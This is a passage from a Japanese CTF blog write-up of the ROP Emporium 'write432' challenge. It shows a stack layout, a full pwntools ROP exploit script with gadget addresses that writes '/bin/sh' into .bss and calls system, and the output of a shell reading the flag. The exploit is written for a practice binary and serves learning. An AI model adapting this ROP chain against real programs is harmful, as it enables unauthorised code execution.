  <span style="color:#f92672">[</span>29<span style="color:#f92672">]</span> .symtab           SYMTAB          <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">001064</span> <span style="color:#ae81ff">000510</span> <span style="color:#ae81ff">10</span>     <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">4</span>
  <span style="color:#f92672">[</span>30<span style="color:#f92672">]</span> .strtab           STRTAB          <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">001574</span> 0002ed <span style="color:#ae81ff">00</span>      <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>
Key to Flags:
  W <span style="color:#f92672">(</span>write<span style="color:#f92672">)</span>, A <span style="color:#f92672">(</span>alloc<span style="color:#f92672">)</span>, X <span style="color:#f92672">(</span>execute<span style="color:#f92672">)</span>, M <span style="color:#f92672">(</span>merge<span style="color:#f92672">)</span>, S <span style="color:#f92672">(</span>strings<span style="color:#f92672">)</span>, I <span style="color:#f92672">(</span>info<span style="color:#f92672">)</span>,
  L <span style="color:#f92672">(</span>link order<span style="color:#f92672">)</span>, O <span style="color:#f92672">(</span>extra OS processing required<span style="color:#f92672">)</span>, G <span style="color:#f92672">(</span>group<span style="color:#f92672">)</span>, T <span style="color:#f92672">(</span>TLS<span style="color:#f92672">)</span>,
  C <span style="color:#f92672">(</span>compressed<span style="color:#f92672">)</span>, x <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>, o <span style="color:#f92672">(</span>OS specific<span style="color:#f92672">)</span>, E <span style="color:#f92672">(</span>exclude<span style="color:#f92672">)</span>,
  p <span style="color:#f92672">(</span>processor specific<span style="color:#f92672">)</span>
$ 
</code></pre></div><p>Wの立っているところがwritableである。
今回は.bssセクションを使う。</p>
<p>最後にsystem関数の呼び出し直前のスタックの状態を考える。
以下のようにすればsystemに引数を渡すことができる。</p>
<table>
<thead>
<tr>
<th style="text-align:left">Low (↑stack growth)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&hellip;</td>
</tr>
<tr>
<td style="text-align:left">system@pltのアドレス(=リターンアドレス)</td>
</tr>
<tr>
<td style="text-align:left">&ldquo;AAAA&rdquo; (=system()終了後のダミーの戻り先)</td>
</tr>
<tr>
<td style="text-align:left">0x0804a040(&ldquo;bin/sh&quot;のアドレス、systemの第一引数)</td>
</tr>
<tr>
<td style="text-align:left">&hellip;</td>
</tr>
<tr>
<td style="text-align:left">High</td>
</tr>
</tbody>
</table>
<p>以上を踏まえてexploitコードは以下になる</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

p<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./write432&#39;</span>)

system_plt<span style="color:#f92672">=</span><span style="color:#ae81ff">0x8048430</span>
mov_edi_ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0x08048670</span>
pop2ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x80486da</span>
bss_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0804a040</span>

payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
payload<span style="color:#f92672">+=</span>p32(pop2ret)
payload<span style="color:#f92672">+=</span>p32(bss_addr)
payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;/bin&#34;</span>
payload<span style="color:#f92672">+=</span>p32(mov_edi_ebp)
payload<span style="color:#f92672">+=</span>p32(pop2ret)
payload<span style="color:#f92672">+=</span>p32(bss_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
payload<span style="color:#f92672">+=</span>p32(mov_edi_ebp)
payload<span style="color:#f92672">+=</span>p32(system_plt)
payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;junk&#34;</span>
payload<span style="color:#f92672">+=</span>p32(bss_addr)

p<span style="color:#f92672">.</span>sendline(payload)
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>実行結果</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python exploit.py
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./write432&#39;</span>: pid <span style="color:#ae81ff">10954</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
&gt; $ cat flag.txt
ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
$ exit
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> reading in interactive
$ 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./write432&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 10954<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got EOF <span style="color:#66d9ef">while</span> sending in interactive
$ 
</code></pre></div><p>flagを入手することができた</p>
<ul class="pa0">
  
   <li class="list di">
     <a href="/tags/ctf/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">CTF</a>
   </li>
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l"><div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
    <p class="f5 b mb3">What&#39;s in this post</p>
      <nav id="TableOfContents"></nav>
  </div>




</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://www.tamaron.dev/" >
    &copy;  tamaron 2022 
  </a>
    <div>
<div class="ananke-socials">
  
    
    <a href="https://twitter.com/tamaroning" target="_blank" rel="noopener" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" aria-label="follow on Twitter——Opens in a new window">
      
        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
</span>
      
<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
</svg>
</span></a>
  
    
    <a href="https://github.com/tamaroning" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
      
        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
</svg>
</span>
      
<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
</svg>
</span></a>
  
</div>
</div>
  </div>
</footer>

  </body>
</html>
